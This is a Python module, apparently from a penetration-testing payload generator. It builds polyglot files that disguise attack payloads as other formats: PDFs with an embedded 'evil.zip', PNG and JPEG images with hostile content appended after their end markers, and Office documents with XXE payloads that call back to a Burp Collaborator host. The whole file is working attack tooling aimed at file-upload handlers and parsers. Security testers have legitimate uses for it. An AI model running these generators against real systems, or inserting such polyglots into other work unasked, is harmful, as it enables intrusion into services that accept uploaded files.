from pathlib import Path
import shutil
import tempfile
import zipfile
from PIL import Image
import struct
import zlib
import io

def create_polyglot_from_existing_payload(source_file, target_ext, burp_collab):
    base_url = f"http://{burp_collab}"
    source_ext = source_file.suffix[1:].lower()
    
    if target_ext == 'pdf':
        if source_ext in ['zip', 'docx', 'xlsx', 'pptx', 'epub', 'jar', 'odt', 'ods', 'odp']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            return create_pdf_polyglot_attachment(source_content, burp_collab)
        elif source_ext in ['svg', 'xml', 'html', 'txt', 'csv', 'rtf', 'md', 'markdown']:
            with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                source_content = f.read()
            return create_pdf_polyglot_attachment(source_content.encode('utf-8'), burp_collab)
        elif source_ext in ['png', 'jpg', 'jpeg', 'gif']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            return create_pdf_polyglot_attachment(source_content, burp_collab)
        elif source_ext in ['mp4', 'webm']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            return create_pdf_polyglot_attachment(source_content, burp_collab)
    
    elif target_ext in ['docx', 'xlsx', 'pptx', 'odt', 'ods', 'odp']:
        if source_ext in ['png', 'jpg', 'jpeg', 'gif', 'svg', 'pdf', 'zip', 'jar']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            if target_ext == 'docx':
                return create_docx_polyglot(source_content, burp_collab, 'xxe')
            elif target_ext == 'xlsx':
                return create_xlsx_polyglot(source_content, burp_collab, 'xxe')
            elif target_ext == 'pptx':
                return create_pptx_polyglot(source_content, burp_collab, 'xxe')
    
    elif target_ext in ['png', 'jpg', 'jpeg', 'gif']:
        if source_ext in ['svg', 'xml', 'html', 'zip', 'jar', 'pdf', 'docx']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            if target_ext == 'png':
                return create_png_polyglot_append(source_content.decode('utf-8', errors='ignore'))
            elif target_ext in ['jpg', 'jpeg']:
                return create_jpg_polyglot_append(source_content.decode('utf-8', errors='ignore'))
            elif target_ext == 'gif':
                return create_gif_with_metadata(source_content.decode('utf-8', errors='ignore'), burp_collab)
    
    elif target_ext == 'svg':
        if source_ext in ['png', 'pdf', 'html', 'zip', 'docx', 'xml']:
            with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                source_content = f.read()
            return f'<svg xmlns="http://www.w3.org/2000/svg"><!-- {source_content[:100]} --><rect width="100" height="100" fill="red"/></svg>'.encode('utf-8')
    
    elif target_ext == 'xml':
        if source_ext in ['svg', 'html', 'zip', 'png', 'pdf']:
            with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                source_content = f.read()
            return f'<?xml version="1.0"?><root><!-- {source_content[:100]} --></root>'.encode('utf-8')
    
    elif target_ext == 'html':
        if source_ext in ['png', 'jpg', 'jpeg', 'svg', 'zip', 'pdf', 'js']:
            with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                source_content = f.read()
            return f'<!DOCTYPE html><html><body><!-- {source_content[:100]} --></body></html>'.encode('utf-8')
    
    elif target_ext == 'zip':
        if source_ext in ['png', 'pdf', 'jar', 'docx']:
            with open(source_file, 'rb') as f:
                source_content = f.read()
            return create_zip_polyglot_append(source_content.decode('utf-8', errors='ignore'))
    
    return None

def create_pdf_polyglot_attachment(payload_content, burp_collab):
    if isinstance(payload_content, str):
        payload_content = payload_content.encode('utf-8')
    
    payload_length = len(payload_content)
    
    pdf_header = b'%PDF-1.4\n'
    pdf_content_part1 = b'''1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [
(evil.zip)
<<
/Type /Filespec
/F (evil.zip)
/EF <<
/F 3 0 R
>>
>>
]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /EmbeddedFile
/Length ''' + str(payload_length).encode('utf-8') + b'''
>>
stream
'''
    pdf_content_part2 = b'''
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
'''
    
    pdf_body = pdf_header + pdf_content_part1 + payload_content + pdf_content_part2
    startxref_pos = len(pdf_body)
    pdf_trailer = str(startxref_pos).encode('utf-8') + b'\n%%EOF'
    
    return pdf_body + pdf_trailer

def create_docx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    from generators.extended_generator import create_docx_polyglot as _create_docx_polyglot
    return _create_docx_polyglot(payload_content, burp_collab, vuln_type)

def create_xlsx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    from generators.extended_generator import create_xlsx_polyglot as _create_xlsx_polyglot
    return _create_xlsx_polyglot(payload_content, burp_collab, vuln_type)

def create_pptx_polyglot(payload_content, burp_collab, vuln_type='xxe'):
    from generators.extended_generator import create_pptx_polyglot as _create_pptx_polyglot
    return _create_pptx_polyglot(payload_content, burp_collab, vuln_type)

def create_png_polyglot_append(payload_content):
    img = Image.new('RGB', (100, 100), color='red')
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'PNG')
    png_data = img_bytes.getvalue()
    iend_pos = png_data.rfind(b'IEND')
    if iend_pos != -1:
        png_data = png_data[:iend_pos + 8]
    return png_data + payload_content.encode('utf-8') if isinstance(payload_content, str) else png_data + payload_content

def create_jpg_polyglot_append(payload_content):
    img = Image.new('RGB', (100, 100), color='red')
    img_bytes = io.BytesIO()
    img.save(img_bytes, 'JPEG', quality=95)
    jpg_data = img_bytes.getvalue()
    return jpg_data + payload_content.encode('utf-8') if isinstance(payload_content, str) else jpg_data + payload_content

def create_gif_with_metadata(payload_content, burp_collab):
    from generators.extended_generator import create_gif_with_metadata as _create_gif_with_metadata
    return _create_gif_with_metadata(payload_content, burp_collab)

def create_zip_polyglot_append(payload_content):
    from generators.extended_generator import create_zip_polyglot_append as _create_zip_polyglot_append
    return _create_zip_polyglot_append(payload_content)

def generate_polyglots_from_existing(output_dir, target_ext, burp_collab):
    output_dir = Path(output_dir)
    base_dir = output_dir.parent
    polyglot_dir = output_dir / 'polyglot'
    
    from generators.pdf_generator import generate_pdf_payloads
    from generators.xlsx_generator import generate_xlsx_payloads
    from generators.docx_generator import generate_docx_payloads
    from generators.pptx_generator import generate_pptx_payloads
    from generators.svg_generator import generate_svg_payloads
    from generators.xml_generator import generate_xml_payloads
    from generators.html_generator import generate_html_payloads
    from generators.image_generator import generate_image_payloads
    from generators.archive_generator import generate_archive_payloads
    from generators.text_generator import generate_text_payloads
    from generators.office_generator import generate_office_payloads
    from generators.webm_generator import generate_webm_payloads
    from generators.mp4_generator import generate_mp4_payloads
    from generators.markdown_generator import generate_markdown_payloads
    
    generators_map = {
        'pdf': (generate_pdf_payloads, None),
        'xlsx': (generate_xlsx_payloads, None),
        'docx': (generate_docx_payloads, None),
        'pptx': (generate_pptx_payloads, None),
        'svg': (generate_svg_payloads, None),
        'xml': (generate_xml_payloads, None),
        'html': (generate_html_payloads, None),
        'gif': (generate_image_payloads, 'gif'),
        'jpg': (generate_image_payloads, 'jpg'),
        'jpeg': (generate_image_payloads, 'jpg'),
        'png': (generate_image_payloads, 'png'),
        'zip': (generate_archive_payloads, 'zip'),
        'jar': (generate_archive_payloads, 'jar'),
        'txt': (generate_text_payloads, 'txt'),
        'csv': (generate_text_payloads, 'csv'),
        'rtf': (generate_text_payloads, 'rtf'),
        'odt': (generate_office_payloads, 'odt'),
        'ods': (generate_office_payloads, 'ods'),
        'odp': (generate_office_payloads, 'odp'),
        'epub': (generate_archive_payloads, 'epub'),
        'webm': (generate_webm_payloads, None),
        'mp4': (generate_mp4_payloads, None),
        'md': (generate_markdown_payloads, None),
        'markdown': (generate_markdown_payloads, None),
    }
    
    source_extensions = ['pdf', 'docx', 'xlsx', 'pptx', 'svg', 'xml', 'html', 'png', 'jpg', 'jpeg', 'gif', 'zip', 'jar', 'epub', 'odt', 'ods', 'odp', 'txt', 'csv', 'rtf', 'md', 'markdown', 'webm', 'mp4']
    
    files_created = False
    
    with tempfile.TemporaryDirectory() as temp_base:
        temp_base_path = Path(temp_base)
        
        for source_ext in source_extensions:
            if source_ext == target_ext:
                continue
            
            if source_ext not in generators_map:
                continue
            
            source_dir = base_dir / source_ext
            temp_source_dir = temp_base_path / source_ext
            
            if source_dir.exists():
                source_dir_to_use = source_dir
            else:
                generator_func, ext_param = generators_map[source_ext]
                temp_source_dir.mkdir(exist_ok=True)
                try:
                    if ext_param:
                        generator_func(temp_source_dir, ext_param, burp_collab)
                    else:
                        generator_func(temp_source_dir, burp_collab)
                    source_dir_to_use = temp_source_dir
                except Exception as e:
                    print(f"[!] Error generating {source_ext} payloads for polyglot: {e}")
                    continue
            
            if not source_dir_to_use.exists():
                continue
            
            for vuln_dir in source_dir_to_use.iterdir():
                if not vuln_dir.is_dir() or vuln_dir.name in ['polyglot', 'master', 'info', 'info_leak', 'dos', 'oob', 'path_traversal']:
                    continue
                
                vuln_type = vuln_dir.name
                
                for source_file in vuln_dir.glob(f'*.{source_ext}'):
                    technique_name = source_file.stem
                    polyglot_content = create_polyglot_from_existing_payload(source_file, target_ext, burp_collab)
                    
                    if polyglot_content:
                        if not files_created:
                            polyglot_dir.mkdir(exist_ok=True)
                            files_created = True
                        
                        source_polyglot_dir = polyglot_dir / source_ext
                        source_polyglot_dir.mkdir(exist_ok=True)
                        
                        target_vuln_dir = source_polyglot_dir / vuln_type
                        target_vuln_dir.mkdir(exist_ok=True)
                        
                        polyglot_filename = f"{technique_name}_{source_ext}.{target_ext}"
                        polyglot_path = target_vuln_dir / polyglot_filename
                        
                        try:
                            if isinstance(polyglot_content, bytes):
                                with open(polyglot_path, 'wb') as f:
                                    f.write(polyglot_content)
                            else:
                                with open(polyglot_path, 'w', encoding='utf-8') as f:
                                    f.write(polyglot_content)
                        except Exception as e:
                            print(f"[!] Error creating polyglot {polyglot_filename}: {e}")
                            continue

